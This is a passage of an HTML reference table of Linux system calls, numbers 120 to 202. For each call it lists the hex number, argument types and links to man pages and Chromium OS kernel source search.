pid</td><td>int policy</td><td>struct sched_param *param</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">120</td><td>sched_getscheduler</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/sched_getscheduler.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sched_getscheduler">cs/</a></td><td align="center">0x78</td><td>pid_t pid</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">121</td><td>sched_getparam</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/sched_getparam.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sched_getparam">cs/</a></td><td align="center">0x79</td><td>pid_t pid</td><td>struct sched_param *param</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">122</td><td>sched_setaffinity</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/sched_setaffinity.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sched_setaffinity">cs/</a></td><td align="center">0x7a</td><td>pid_t pid</td><td>unsigned int len</td><td>unsigned long *user_mask_ptr</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">123</td><td>sched_getaffinity</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/sched_getaffinity.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sched_getaffinity">cs/</a></td><td align="center">0x7b</td><td>pid_t pid</td><td>unsigned int len</td><td>unsigned long *user_mask_ptr</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">124</td><td>sched_yield</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/sched_yield.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sched_yield">cs/</a></td><td align="center">0x7c</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">125</td><td>sched_get_priority_max</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/sched_get_priority_max.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sched_get_priority_max">cs/</a></td><td align="center">0x7d</td><td>int policy</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">126</td><td>sched_get_priority_min</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/sched_get_priority_min.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sched_get_priority_min">cs/</a></td><td align="center">0x7e</td><td>int policy</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">127</td><td>sched_rr_get_interval</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/sched_rr_get_interval.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sched_rr_get_interval">cs/</a></td><td align="center">0x7f</td><td>pid_t pid</td><td>struct __kernel_timespec *interval</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">128</td><td>restart_syscall</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/restart_syscall.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*restart_syscall">cs/</a></td><td align="center">0x80</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">129</td><td>kill</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/kill.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*kill">cs/</a></td><td align="center">0x81</td><td>pid_t pid</td><td>int sig</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">130</td><td>tkill</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/tkill.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*tkill">cs/</a></td><td align="center">0x82</td><td>pid_t pid</td><td>int sig</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">131</td><td>tgkill</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/tgkill.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*tgkill">cs/</a></td><td align="center">0x83</td><td>pid_t tgid</td><td>pid_t pid</td><td>int sig</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">132</td><td>sigaltstack</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/sigaltstack.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sigaltstack">cs/</a></td><td align="center">0x84</td><td>const struct sigaltstack *uss</td><td>struct sigaltstack *uoss</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">133</td><td>rt_sigsuspend</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/rt_sigsuspend.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*rt_sigsuspend">cs/</a></td><td align="center">0x85</td><td>sigset_t *unewset</td><td>size_t sigsetsize</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">134</td><td>rt_sigaction</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/rt_sigaction.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*rt_sigaction">cs/</a></td><td align="center">0x86</td><td>int</td><td>const struct sigaction *</td><td>struct sigaction *</td><td>size_t</td><td>-</td><td>-</td></tr><tr><td align="center">135</td><td>rt_sigprocmask</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/rt_sigprocmask.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*rt_sigprocmask">cs/</a></td><td align="center">0x87</td><td>int how</td><td>sigset_t *set</td><td>sigset_t *oset</td><td>size_t sigsetsize</td><td>-</td><td>-</td></tr><tr><td align="center">136</td><td>rt_sigpending</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/rt_sigpending.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*rt_sigpending">cs/</a></td><td align="center">0x88</td><td>sigset_t *set</td><td>size_t sigsetsize</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">137</td><td>rt_sigtimedwait</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/rt_sigtimedwait.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*rt_sigtimedwait">cs/</a></td><td align="center">0x89</td><td>const sigset_t *uthese</td><td>siginfo_t *uinfo</td><td>const struct __kernel_timespec *uts</td><td>size_t sigsetsize</td><td>-</td><td>-</td></tr><tr><td align="center">138</td><td>rt_sigqueueinfo</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/rt_sigqueueinfo.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*rt_sigqueueinfo">cs/</a></td><td align="center">0x8a</td><td>pid_t pid</td><td>int sig</td><td>siginfo_t *uinfo</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">139</td><td>rt_sigreturn</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/rt_sigreturn.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*rt_sigreturn">cs/</a></td><td align="center">0x8b</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">140</td><td>setpriority</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/setpriority.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setpriority">cs/</a></td><td align="center">0x8c</td><td>int which</td><td>int who</td><td>int niceval</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">141</td><td>getpriority</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getpriority.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getpriority">cs/</a></td><td align="center">0x8d</td><td>int which</td><td>int who</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">142</td><td>reboot</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/reboot.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*reboot">cs/</a></td><td align="center">0x8e</td><td>int magic1</td><td>int magic2</td><td>unsigned int cmd</td><td>void *arg</td><td>-</td><td>-</td></tr><tr><td align="center">143</td><td>setregid</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/setregid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setregid">cs/</a></td><td align="center">0x8f</td><td>gid_t rgid</td><td>gid_t egid</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">144</td><td>setgid</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/setgid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setgid">cs/</a></td><td align="center">0x90</td><td>gid_t gid</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">145</td><td>setreuid</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/setreuid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setreuid">cs/</a></td><td align="center">0x91</td><td>uid_t ruid</td><td>uid_t euid</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">146</td><td>setuid</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/setuid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setuid">cs/</a></td><td align="center">0x92</td><td>uid_t uid</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">147</td><td>setresuid</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/setresuid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setresuid">cs/</a></td><td align="center">0x93</td><td>uid_t ruid</td><td>uid_t euid</td><td>uid_t suid</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">148</td><td>getresuid</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getresuid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getresuid">cs/</a></td><td align="center">0x94</td><td>uid_t *ruid</td><td>uid_t *euid</td><td>uid_t *suid</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">149</td><td>setresgid</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/setresgid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setresgid">cs/</a></td><td align="center">0x95</td><td>gid_t rgid</td><td>gid_t egid</td><td>gid_t sgid</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">150</td><td>getresgid</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getresgid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getresgid">cs/</a></td><td align="center">0x96</td><td>gid_t *rgid</td><td>gid_t *egid</td><td>gid_t *sgid</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">151</td><td>setfsuid</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/setfsuid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setfsuid">cs/</a></td><td align="center">0x97</td><td>uid_t uid</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">152</td><td>setfsgid</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/setfsgid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setfsgid">cs/</a></td><td align="center">0x98</td><td>gid_t gid</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">153</td><td>times</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/times.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*times">cs/</a></td><td align="center">0x99</td><td>struct tms *tbuf</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">154</td><td>setpgid</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/setpgid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setpgid">cs/</a></td><td align="center">0x9a</td><td>pid_t pid</td><td>pid_t pgid</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">155</td><td>getpgid</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getpgid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getpgid">cs/</a></td><td align="center">0x9b</td><td>pid_t pid</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">156</td><td>getsid</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getsid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getsid">cs/</a></td><td align="center">0x9c</td><td>pid_t pid</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">157</td><td>setsid</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/setsid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setsid">cs/</a></td><td align="center">0x9d</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">158</td><td>getgroups</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getgroups.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getgroups">cs/</a></td><td align="center">0x9e</td><td>int gidsetsize</td><td>gid_t *grouplist</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">159</td><td>setgroups</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/setgroups.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setgroups">cs/</a></td><td align="center">0x9f</td><td>int gidsetsize</td><td>gid_t *grouplist</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">160</td><td>uname</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/uname.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*uname">cs/</a></td><td align="center">0xa0</td><td>struct old_utsname *</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">161</td><td>sethostname</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/sethostname.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sethostname">cs/</a></td><td align="center">0xa1</td><td>char *name</td><td>int len</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">162</td><td>setdomainname</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/setdomainname.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setdomainname">cs/</a></td><td align="center">0xa2</td><td>char *name</td><td>int len</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">163</td><td>getrlimit</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getrlimit.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getrlimit">cs/</a></td><td align="center">0xa3</td><td>unsigned int resource</td><td>struct rlimit *rlim</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">164</td><td>setrlimit</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/setrlimit.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setrlimit">cs/</a></td><td align="center">0xa4</td><td>unsigned int resource</td><td>struct rlimit *rlim</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">165</td><td>getrusage</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getrusage.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getrusage">cs/</a></td><td align="center">0xa5</td><td>int who</td><td>struct rusage *ru</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">166</td><td>umask</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/umask.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*umask">cs/</a></td><td align="center">0xa6</td><td>int mask</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">167</td><td>prctl</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/prctl.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*prctl">cs/</a></td><td align="center">0xa7</td><td>int option</td><td>unsigned long arg2</td><td>unsigned long arg3</td><td>unsigned long arg4</td><td>unsigned long arg5</td><td>-</td></tr><tr><td align="center">168</td><td>getcpu</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getcpu.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getcpu">cs/</a></td><td align="center">0xa8</td><td>unsigned *cpu</td><td>unsigned *node</td><td>struct getcpu_cache *cache</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">169</td><td>gettimeofday</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/gettimeofday.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*gettimeofday">cs/</a></td><td align="center">0xa9</td><td>struct timeval *tv</td><td>struct timezone *tz</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">170</td><td>settimeofday</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/settimeofday.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*settimeofday">cs/</a></td><td align="center">0xaa</td><td>struct timeval *tv</td><td>struct timezone *tz</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">171</td><td>adjtimex</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/adjtimex.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*adjtimex">cs/</a></td><td align="center">0xab</td><td>struct __kernel_timex *txc_p</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">172</td><td>getpid</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getpid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getpid">cs/</a></td><td align="center">0xac</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">173</td><td>getppid</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getppid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getppid">cs/</a></td><td align="center">0xad</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">174</td><td>getuid</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getuid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getuid">cs/</a></td><td align="center">0xae</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">175</td><td>geteuid</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/geteuid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*geteuid">cs/</a></td><td align="center">0xaf</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">176</td><td>getgid</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getgid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getgid">cs/</a></td><td align="center">0xb0</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">177</td><td>getegid</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getegid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getegid">cs/</a></td><td align="center">0xb1</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">178</td><td>gettid</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/gettid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*gettid">cs/</a></td><td align="center">0xb2</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">179</td><td>sysinfo</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/sysinfo.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sysinfo">cs/</a></td><td align="center">0xb3</td><td>struct sysinfo *info</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">180</td><td>mq_open</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/mq_open.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*mq_open">cs/</a></td><td align="center">0xb4</td><td>const char *name</td><td>int oflag</td><td>umode_t mode</td><td>struct mq_attr *attr</td><td>-</td><td>-</td></tr><tr><td align="center">181</td><td>mq_unlink</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/mq_unlink.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*mq_unlink">cs/</a></td><td align="center">0xb5</td><td>const char *name</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">182</td><td>mq_timedsend</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/mq_timedsend.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*mq_timedsend">cs/</a></td><td align="center">0xb6</td><td>mqd_t mqdes</td><td>const char *msg_ptr</td><td>size_t msg_len</td><td>unsigned int msg_prio</td><td>const struct __kernel_timespec *abs_timeout</td><td>-</td></tr><tr><td align="center">183</td><td>mq_timedreceive</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/mq_timedreceive.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*mq_timedreceive">cs/</a></td><td align="center">0xb7</td><td>mqd_t mqdes</td><td>char *msg_ptr</td><td>size_t msg_len</td><td>unsigned int *msg_prio</td><td>const struct __kernel_timespec *abs_timeout</td><td>-</td></tr><tr><td align="center">184</td><td>mq_notify</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/mq_notify.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*mq_notify">cs/</a></td><td align="center">0xb8</td><td>mqd_t mqdes</td><td>const struct sigevent *notification</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">185</td><td>mq_getsetattr</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/mq_getsetattr.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*mq_getsetattr">cs/</a></td><td align="center">0xb9</td><td>mqd_t mqdes</td><td>const struct mq_attr *mqstat</td><td>struct mq_attr *omqstat</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">186</td><td>msgget</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/msgget.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*msgget">cs/</a></td><td align="center">0xba</td><td>key_t key</td><td>int msgflg</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">187</td><td>msgctl</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/msgctl.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*msgctl">cs/</a></td><td align="center">0xbb</td><td>int msqid</td><td>int cmd</td><td>struct msqid_ds *buf</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">188</td><td>msgrcv</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/msgrcv.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*msgrcv">cs/</a></td><td align="center">0xbc</td><td>int msqid</td><td>struct msgbuf *msgp</td><td>size_t msgsz</td><td>long msgtyp</td><td>int msgflg</td><td>-</td></tr><tr><td align="center">189</td><td>msgsnd</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/msgsnd.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*msgsnd">cs/</a></td><td align="center">0xbd</td><td>int msqid</td><td>struct msgbuf *msgp</td><td>size_t msgsz</td><td>int msgflg</td><td>-</td><td>-</td></tr><tr><td align="center">190</td><td>semget</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/semget.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*semget">cs/</a></td><td align="center">0xbe</td><td>key_t key</td><td>int nsems</td><td>int semflg</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">191</td><td>semctl</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/semctl.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*semctl">cs/</a></td><td align="center">0xbf</td><td>int semid</td><td>int semnum</td><td>int cmd</td><td>unsigned long arg</td><td>-</td><td>-</td></tr><tr><td align="center">192</td><td>semtimedop</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/semtimedop.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*semtimedop">cs/</a></td><td align="center">0xc0</td><td>int semid</td><td>struct sembuf *sops</td><td>unsigned nsops</td><td>const struct __kernel_timespec *timeout</td><td>-</td><td>-</td></tr><tr><td align="center">193</td><td>semop</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/semop.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*semop">cs/</a></td><td align="center">0xc1</td><td>int semid</td><td>struct sembuf *sops</td><td>unsigned nsops</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">194</td><td>shmget</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/shmget.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*shmget">cs/</a></td><td align="center">0xc2</td><td>key_t key</td><td>size_t size</td><td>int flag</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">195</td><td>shmctl</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/shmctl.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*shmctl">cs/</a></td><td align="center">0xc3</td><td>int shmid</td><td>int cmd</td><td>struct shmid_ds *buf</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">196</td><td>shmat</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/shmat.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*shmat">cs/</a></td><td align="center">0xc4</td><td>int shmid</td><td>char *shmaddr</td><td>int shmflg</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">197</td><td>shmdt</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/shmdt.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*shmdt">cs/</a></td><td align="center">0xc5</td><td>char *shmaddr</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">198</td><td>socket</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/socket.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*socket">cs/</a></td><td align="center">0xc6</td><td>int</td><td>int</td><td>int</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">199</td><td>socketpair</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/socketpair.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*socketpair">cs/</a></td><td align="center">0xc7</td><td>int</td><td>int</td><td>int</td><td>int *</td><td>-</td><td>-</td></tr><tr><td align="center">200</td><td>bind</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/bind.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*bind">cs/</a></td><td align="center">0xc8</td><td>int</td><td>struct sockaddr *</td><td>int</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">201</td><td>listen</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/listen.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*listen">cs/</a></td><td align="center">0xc9</td><td>int</td><td>int</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">202</td><td>accept</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/accept.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*accept">cs/</a></td><td align="center">0xca</td><td>int</td><td>struct sockaddr *</td><td>int 